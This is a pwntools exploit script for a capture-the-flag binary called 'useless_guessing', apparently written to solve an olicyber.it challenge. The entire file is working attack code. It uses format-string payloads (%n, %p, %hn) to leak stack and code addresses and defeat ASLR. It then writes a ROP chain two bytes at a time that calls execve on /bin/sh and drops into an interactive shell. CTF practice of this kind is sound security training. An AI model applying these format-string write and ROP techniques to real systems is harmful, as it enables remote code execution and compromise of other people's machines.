from pwn import *

context.binary = elf = ELF('./useless_guessing')
context.terminal = ('kgx', '-e')


if args.REMOTE:
    r = remote('uselessguessing.challs.olicyber.it', 38071)
elif args.GDB:
    r = gdb.debug('./useless_guessing', gdbscript='b chall\nb log_event\nb *chall+331\nc')
else:
    r = process('./useless_guessing')

r.sendlineafter(b'Who are you?', b'%25$n%22$p%23$p')
r.sendlineafter(b'What is the secret?', b'\x1c\x00')

gadgets = {
    'syscall': 0x887f,
    'sh': elf.search(b'sh\x00').__next__(),
    'pop rdi': 0x917f,
    'pop rax': 0x574f7,
    'pop rsi': 0x111ee,
}


r.recvuntil(b'attempt: ')
r.recvuntil(b'0x')
stack = int(r.recvuntil(b'0x', drop=True).decode(), 16)
return_address = int(r.recvline().strip().decode(), 16)

elf.address = return_address - (elf.sym['chall'] + 185)

log.info(f'Stack: {hex(stack)}')
log.info(f'Return address: {hex(return_address)}')
log.info(f'ELF base address: {hex(elf.address)}')

to_write = elf.sym['chall'] & 0xffff

padding = ' ' * (8 - len(f'%{to_write - 0x1c + 45 - 3}c%28$hn') % 8)
r.sendafter(b'Who are you?', (f'%{to_write - 0x1c + 45 - 3}c%28$hn' + padding).encode() + p64(stack - 0x68))
# end first chall

payload = flat([
    p64(elf.address + gadgets['pop rdi']),
    p64(stack - 0x50),
    p64(elf.address + gadgets['pop rsi']),
    p64(0),
    p64(elf.address + gadgets['pop rax']),
    p64(0x3b),
    p64(elf.address + gadgets['syscall']),
])

for i in range(0,len(payload),2):

    part = u16(payload[i:i+2])

    padding = ' ' * (8 - len(f'%{(part - 25 - 3)&0xffff}c%28$hn') % 8)
    r.sendlineafter(b'Who are you?', (f'%{(part - 25 - 3) & 0xffff}c%28$hn' + padding).encode() + p64(stack + 0x8 + i))
    r.sendlineafter(b'What is the secret?', b'\x1c\x00')

    # recall chall
    padding = ' ' * (8 - len(f'%{to_write - 0x1c + 45 - 3}c%28$hn') % 8)
    r.sendafter(b'Who are you?', (f'%{to_write - 0x1c + 45 - 3}c%28$hn' + padding).encode() + p64(stack - 0x68))

r.sendlineafter(b'Who are you?', b'\x00')
r.sendlineafter(b'What is the secret?', b'\x1c\x00')

r.sendlineafter(b'Who are you?', b'/bin/sh\x00')

r.interactive()
